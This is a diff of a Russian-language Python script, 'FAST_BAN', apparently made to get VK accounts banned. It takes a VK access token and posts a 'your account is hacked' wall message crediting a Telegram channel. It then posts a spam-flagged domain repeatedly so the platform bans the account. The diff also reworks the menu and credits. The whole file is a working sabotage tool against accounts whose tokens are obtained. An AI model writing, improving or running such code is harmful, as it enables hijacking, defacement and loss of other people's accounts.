@@ -1,84 +1,68 @@
 import requests
 import vk_api
 import os
-import platform
 import time
-from colorama import Fore, Back, Style
+from colorama import Fore, Back, Style 
 def fastban():
+    os.system("clear")
     intro = """  
-    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒    
+   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   
     ▒▒▐▐▐▐▐▐▐▐▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒
-    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▐▐▒▒▒▐▐▒▒
+   ▒▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▐▐▒▒▒▐▐▒▒▒
     ▒▒▐▐▐▐▐▐▒▒▐▐▐▐▐▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▐▐▒▒▐▐▒▒
-    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▐▐▒▒▒▐▐▒▒▐▐▒▐▐▒▒
+   ▒▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▐▐▒▒▒▐▐▒▒▐▐▒▐▐▒▒▒
     ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▒▒
-    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▒▒▐▐▒▒
+   ▒▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒
     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+   ▒▒▒                                           ▒▒▒
+    ▒▒ FAST_BAN                                  ▒▒
+   ▒▒▒  CHANNEL @coding_lab       Version 3.0    ▒▒▒
     ▒▒                                           ▒▒
-    ▒▒ FAST_BAN DEVOLOPER DARK CODING            ▒▒
-    ▒▒ TELEGRAM: @affonsy    CHANNEL @darkkoding ▒▒
-    ▒▒ TELEGRAM: @BatyaRimskiy1                  ▒▒
-    ▒▒ Beta version 3.0                          ▒▒
-    ▒▒                                           ▒▒
-    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
     """
-    print(Fore.RED + intro)
-    print(Fore.WHITE + """ 
-    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-    |                                             |
-    |   1.BAN  Пост-Бан Сова никогда не спит      |
-    |   2.BAN  Пост-Бан vkbot.ru                  |
-    |   3.BAN  Пост-Бан vto.pe                    |
-    |   4.CREDITS                                 |
-    |                                             |
-    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+    print(Fore.GREEN + intro)
+    print(Fore.WHITE + """
+   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+    ▒▒                                           ▒▒
+   ▒▒▒  [1] WALL-POST-BAN                        ▒▒▒
+    ▒▒  [2] DEVOLOPERS                           ▒▒
+   ▒▒▒  [3] EXIT                                 ▒▒▒
+    ▒▒                                           ▒▒
+   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
     """)
     a = input("[Enter number] -> ")
     if a == "1":
         tok = input("[ACCESS-TOKEN] -> ") 
         token = vk_api.VkApi(token = tok) 
         vk = token.get_api()
-        vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
+        vk.wall.post(message='Твоя жопа взломана! Ответственность взял канал в телеграмме @coding_lab')
         for var in range(5):
-            time.sleep(5)
-            vk.wall.post(message='Сова никогда не спит')             
+            time.sleep(3)
+            vk.wall.post(message='vto.pe')             
             print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
-        os.system("clear")
+        print(Back.BLACK + Fore.WHITE + "22")
+        os.system("clear")   
         fastban()
     if a == "2":
-        tok = input("[ACCESS-TOKEN] -> ") 
-        token = vk_api.VkApi(token = tok) 
-        vk = token.get_api()
-        vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
-        for var in range(5):
-            time.sleep(5)
-            vk.wall.post(message='vkbot.ru')            
-            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
-        os.system("clear")
-        fastban()
-    if a == "3":
-        tok = input("[ACCESS-TOKEN] -> ") 
-        token = vk_api.VkApi(token = tok) 
-        vk = token.get_api()
-        vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
-        for var in range(5):
-            time.sleep(5)
-            vk.wall.post(message='vto.pe')
-            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
-        os.system("clear")
-        fastban()
-    if a == "4":
         print("""
-        Главный разработчик TELEGRAM: @affonsy
-        Разработчик2 TELEGRAM: @BatyaRimskiy1
-        
-        ЧТО БЫ ВЫЙТИ В ГЛАВНОЕ МЕНЮ НАЖМИТЕ НА Enter 
+   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+    ▒▒                                           ▒▒
+   ▒▒▒ DEVOLOPERS                                ▒▒▒
+    ▒▒ TELEGRAM: @cod1ng_lab                     ▒▒
+   ▒▒▒ TELEGRAM: @BatyaRimskiy1                  ▒▒▒
+    ▒▒ Для выхода в главное меню нажмите Enter   ▒▒
+   ▒▒▒                                           ▒▒▒
+    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 
         """)
-        c = input("[Enter] -> ")
+        c = input("-> : ")
         if c == "1":
             os.system("clear")
             fastban()
         else:
             os.system("clear")
             fastban()
+    if a == "3":
+        os.system("exit")
+    else:
+        fastban()
 fastban()
